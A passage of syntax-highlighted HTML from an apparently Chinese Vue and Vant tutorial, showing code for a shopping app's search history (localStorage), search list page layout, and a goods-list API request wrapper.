#D4D4D4">.</span><span style="color: #9CDCFE">historyList</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 跳转到搜索列表页面</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">`/searchlist?search=</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">searchContent</span><span style="color: #569CD6">}</span><span style="color: #CE9178">`</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">clearHistory</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">historyList</span><span style="color: #D4D4D4"> = [];</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">setHistory</span><span style="color: #D4D4D4">([]);</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">...</span></span></code></pre></div></div></figure><p>持久化存储代码：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">HISTORY_KEY</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"shopping_history_info"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 获取搜索历史</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getHistory</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">history</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">localStorage</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getItem</span><span style="color: #D4D4D4">(</span><span style="color: #4FC1FF">HISTORY_KEY</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">history</span><span style="color: #D4D4D4"> ? </span><span style="color: #4FC1FF">JSON</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">parse</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">history</span><span style="color: #D4D4D4">) : [];</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #6A9955">// 设置搜索历史</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">setHistory</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">arr</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">localStorage</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">setItem</span><span style="color: #D4D4D4">(</span><span style="color: #4FC1FF">HISTORY_KEY</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">JSON</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">stringify</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">arr</span><span style="color: #D4D4D4">));</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><h3 id="搜索列表页"><a class="markdownIt-Anchor" href="#搜索列表页"></a> 搜索列表页</h3><h4 id="静态布局"><a class="markdownIt-Anchor" href="#静态布局"></a> 静态布局</h4><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"search"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-nav-bar</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">fixed</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"商品列表"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">left-arrow</span></span><span class="line"><span style="color: #D4D4D4">      @</span><span style="color: #9CDCFE">click-left</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">go</span><span style="color: #D4D4D4">(-</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">    /</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-search</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">readonly</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">shape</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"round"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">background</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"#ffffff"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"手机"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">show-action</span></span><span class="line"><span style="color: #D4D4D4">      @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'/search'</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #D4D4D4"> #</span><span style="color: #9CDCFE">action</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"tool"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"apps-o"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-search</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 排序选项按钮 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"sort-btns"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"sort-item"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">综合</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"sort-item"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">销量</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"sort-item"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">价格</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"goods-list"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">GoodsItem</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-for</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">in</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">10</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">key</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #4EC9B0">GoodsItem</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">GoodsItem</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/components/GoodsItem.vue"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"SearchIndex"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">components:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">GoodsItem</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">style</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">lang</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"less"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">scoped</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D7BA7D">.search</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">46px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  ::</span><span style="color: #569CD6">v-deep</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.van-icon-arrow-left</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#333</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.tool</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">24px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">40px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">40px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.sort-btns</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">36px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">36px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.sort-item</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">text-align</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">flex</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">16px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 商品样式</span></span><span class="line"><span style="color: #D7BA7D">.goods-list</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#f6f6f6</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><h4 id="渲染"><a class="markdownIt-Anchor" href="#渲染"></a> 渲染</h4><p>封装请求获取商品列表 <code>api/product.js</code></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"../utils/request"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getProducts</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">sortType</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">sortPrice</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">categoryId</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">goodsName</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">page</span><span style="color: #D4D4D4"> } = </span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">get</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/goods/list"</span><span style="color: #D4D4D4">, {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">params:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// all-按综合搜索(默认)，sales-按销量，price-按价格</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">sortType</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 0-价格从低到高，1-价格从高到低</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">sortPrice</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 分类id，示例值：0</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">categoryId</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 商品名称，示例值：酒</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">goodsName</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 页码，示例值：1</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">page</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>基于搜索词进行渲染</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"search"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-nav-bar</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">fixed</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"商品列表"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">left-arrow</span></span><span class="line"><span style="color: #D4D4D4">      @</span><span style="color: #9CDCFE">click-left</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">go</span><span style="color: #D4D4D4">(-</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">    /</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-search</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">readonly</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">shape</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"round"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">background</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"#ffffff"</span></span><span class="line"><span style="color: #D4D4D4">      :</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">queryParam</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">show-action</span></span><span class="line"><span style="color: #D4D4D4">      @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'/search'</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #D4D4D4"> #</span><span style="color: #9CDCFE">action</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"tool"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"apps-o"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-search</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 排序选项按钮 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"sort-btns"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"sort-item"</span></span><span class="line"><span style="color: #D4D4D4">        :</span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4">{ </span><span style="color: #C8C8C8">active</span><span style="color: #D4D4D4">: </span><span style="color: #9CDCFE">currentSortType</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">'all'</span><span style="color: #D4D4D4"> }</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        